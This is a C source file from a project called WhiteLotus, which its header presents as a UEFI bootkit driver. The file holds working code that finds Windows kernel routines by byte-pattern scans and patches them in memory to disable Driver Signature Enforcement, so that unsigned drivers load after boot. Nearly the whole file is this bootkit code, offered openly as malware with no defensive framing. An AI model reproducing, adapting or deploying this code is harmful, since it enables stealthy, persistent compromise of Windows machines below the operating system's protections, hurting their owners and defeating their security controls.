/*
 * ============================================================
 *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
 *  File     : PatchKernel.c
 * ============================================================
 *
 *  Description:
 *    Patches ntoskrnl.exe in-memory to disable Driver
 *    Signature Enforcement (DSE). Locates
 *    SepInitializeCodeIntegrity by scanning for the
 *    CiInitialize IAT call pattern, and SeValidateImageData
 *    by searching for the 0xC0000428 (STATUS_INVALID_IMAGE)
 *    mov instruction, then overwrites the critical bytes to
 *    bypass signature validation.
 *
 *  Purpose:
 *    - Disable DSE at kernel initialization so that unsigned
 *      drivers can be loaded after boot without interception.
 *
 *  Author   : 0xbekoo
 *  Blog     : https://0xbekoo.github.io
 *  Updated  : 2026-05-21
 *
 * ============================================================
 */

#include "WhiteLotus.h"

// Global kernel patch information
KERNEL_PATCH_INFORMATION gKernelPatchInfo;

// Disable Driver Signature Enforcement (DSE) by patching CI.dll functions
// Called from HookedOslFwpKernelSetupPhase1 after kernel is loaded
STATIC EFI_STATUS EFIAPI DisableDSE(
  IN CONST UINT8* ImageBase,
  IN PEFI_IMAGE_NT_HEADERS NtHeaders,
  IN PEFI_IMAGE_SECTION_HEADER InitSection,
  IN PEFI_IMAGE_SECTION_HEADER TextSection
) {
  gBlStatusPrint(L"DSE patch has been triggered!\n");

  // Find CiInitialize in CI.dll import address table
  VOID* CiInitialize;
  CONST EFI_STATUS IatStatus = FindIATAddressForImport(ImageBase, NtHeaders, \
                "CI.dll", "CiInitialize", &CiInitialize);
  if (EFI_ERROR(IatStatus)) {
    gBlStatusPrint(L"Failed to find the address of CI!");
    return IatStatus;
  }
  gBlStatusPrint(L"Found the address of CI: 0x%p\n", CiInitialize);

  // Find PAGE section (contains CI initialization code)
  PEFI_IMAGE_SECTION_HEADER PageSection = NULL;
  PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);
  UINT16 NumberOfSections = NtHeaders->FileHeader.NumberOfSections;

  for (UINT16 i = 0; i < NumberOfSections; i++) {
    if (AsciiStrnCmp((CHAR8*)Section[i].Name, "PAGE", 4) == 0) {
      PageSection = &Section[i];
      gBlStatusPrint(L"Found PAGE section at RVA: 0x%X\n", PageSection->VirtualAddress);
      break;
    }
  }

  if (NULL == PageSection) {
    gBlStatusPrint(L"Failed to find PAGE section!\n");
    return EFI_NOT_FOUND;
  }

  CONST UINT8* PageStart = ImageBase + PageSection->VirtualAddress;
  UINT32 PageSize = PageSection->SizeOfRawData;

  CONST UINT8* LastMovEcx = NULL;
  CONST UINT8* SepInitializeMovEcxAddress = NULL;

  for (UINT32 i = 0; i < PageSize - 7; i++) {
    // Track recent mov ecx instructions (potential SepInitializeCodeIntegrity entry points)
    if ((PageStart[i] == 0x33 && PageStart[i+1] == 0xC9) ||
      (PageStart[i] == 0x31 && PageStart[i+1] == 0xC9) ||
      (PageStart[i] == 0xB1) ||
      (PageStart[i] == 0x89 && (PageStart[i+1] & 0xF8) == 0xC8) ||
      (PageStart[i] == 0x8B && (PageStart[i+1] & 0xF8) == 0xC8))
    {
      LastMovEcx = PageStart + i;
    }

    // Search for CiInitialize call pattern
    // Pattern 1: FF 15 - call qword ptr [rip+disp32] (Windows 10 RS2+)
    if (PageStart[i] == 0xFF && PageStart[i+1] == 0x15) {
      CONST UINT8* Rip = PageStart + i + 6;
      INT32 Disp = *(INT32*)(PageStart + i + 2);
      CONST UINT8* TargetAddr = Rip + Disp;

      if (TargetAddr == (CONST UINT8*)CiInitialize) {
        if (LastMovEcx != NULL) {
          SepInitializeMovEcxAddress = LastMovEcx;
          gBlStatusPrint(L"Found mov ecx in SepInitializeCodeIntegrity at: 0x%p\n", SepInitializeMovEcxAddress);
          break;
        }
      }
    }

    // Search for CiInitialize call pattern
    // Pattern 2: 48 FF 25 - jmp qword ptr [rip+disp32] (Windows 8/8.1)
    if (PageStart[i] == 0x48 && PageStart[i+1] == 0xFF && PageStart[i+2] == 0x25) {
      CONST UINT8* Rip = PageStart + i + 7;
      INT32 Disp = *(INT32*)(PageStart + i + 3);
      CONST UINT8* TargetAddr = Rip + Disp;

      if (TargetAddr == (CONST UINT8*)CiInitialize) {
        if (LastMovEcx != NULL) {
          SepInitializeMovEcxAddress = LastMovEcx;
          gBlStatusPrint(L"Found mov ecx in SepInitializeCodeIntegrity at: 0x%p\n", SepInitializeMovEcxAddress);
          break;
        }
      }
    }
  }

  if (SepInitializeMovEcxAddress == NULL) {
    gBlStatusPrint(L"Failed to find SepInitializeCodeIntegrity pattern!\n");
    return EFI_NOT_FOUND;
  }

  // Search for mov eax, 0xC0000428 instruction in SeValidateImageData
  // This value indicates signature validation failure (STATUS_INVALID_IMAGE_NOT_64BIT)
  CONST UINT8* SeValidateImageDataMovEaxAddress = NULL;
  for (UINT32 i = 0; i < PageSize - 7; i++) {
    // B8 28 04 00 C0 = mov eax, 0xC0000428
    if (PageStart[i]   == 0xB8 &&
      PageStart[i+1] == 0x28 &&
      PageStart[i+2] == 0x04 &&
      PageStart[i+3] == 0x00 &&
      PageStart[i+4] == 0xC0)
    {
      UINT8 Next = PageStart[i+5];
      if (Next == 0xEB || Next == 0xE9 || Next == 0xC3) {
        SeValidateImageDataMovEaxAddress = PageStart + i;
        gBlStatusPrint(L"Found mov eax, 0xC0000428 in SeValidateImageData at: 0x%p\n", SeValidateImageDataMovEaxAddress);
        break;
      }
    }
  }

  if (SeValidateImageDataMovEaxAddress == NULL) {
    gBlStatusPrint(L"Failed to find SeValidateImageData pattern!\n");
    return EFI_NOT_FOUND;
  }

  // Apply DSE bypass patches:
  // 1. Patch SepInitializeCodeIntegrity: xor ecx, ecx (33 C9) - disable CI initialization
  UINT8 XorEcxPatch[] = { 0x33, 0xC9 };
  CopyWpMem((VOID*)SepInitializeMovEcxAddress, XorEcxPatch, sizeof(XorEcxPatch));
  gBlStatusPrint(L"Patched SepInitializeCodeIntegrity at: 0x%p\n", SepInitializeMovEcxAddress);

  // 2. Patch SeValidateImageData: change 0xC0000428 to 0x00000000 - bypass signature check
  UINT32 Zero = 0;
  CopyWpMem((VOID*)(SeValidateImageDataMovEaxAddress + 1), &Zero, sizeof(Zero));
gBlStatusPrint(L"Patched SeValidateImageData at: 0x%p\n", SeValidateImageDataMovEaxAddress);
  return EFI_SUCCESS;
}

// Patch ntoskrnl.exe to disable Driver Signature Enforcement
// Called from winload after kernel is loaded into memory
EFI_STATUS EFIAPI PatchNtoskrnl(
  IN CONST VOID* ImageBase,
  IN PEFI_IMAGE_NT_HEADERS NtHeaders
) {

  DEBUG((DEBUG_INFO, "[WhiteLotus] ntoskrnl.exe: 0x%p\n", (UINTN)ImageBase));
  PEFI_IMAGE_SECTION_HEADER InitSection = NULL, TextSection = NULL, PageSection = NULL;
  PEFI_IMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION(NtHeaders);

  for (UINT16 i = 0; i < NtHeaders->FileHeader.NumberOfSections; ++i) {
    CHAR8 SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME + 1];
    CopyMem(SectionName, Section->Name, EFI_IMAGE_SIZEOF_SHORT_NAME);
    SectionName[EFI_IMAGE_SIZEOF_SHORT_NAME] = '\0';

    if (AsciiStrCmp(SectionName, "INIT") == 0)
      InitSection = Section;
    else if (AsciiStrCmp(SectionName, ".text") == 0)
      TextSection = Section;
    else if (AsciiStrCmp(SectionName, "PAGE") == 0)
      PageSection = Section;

    Section++;
  }

  DisableDSE(ImageBase, NtHeaders, InitSection, TextSection);
  return EFI_SUCCESS;
}
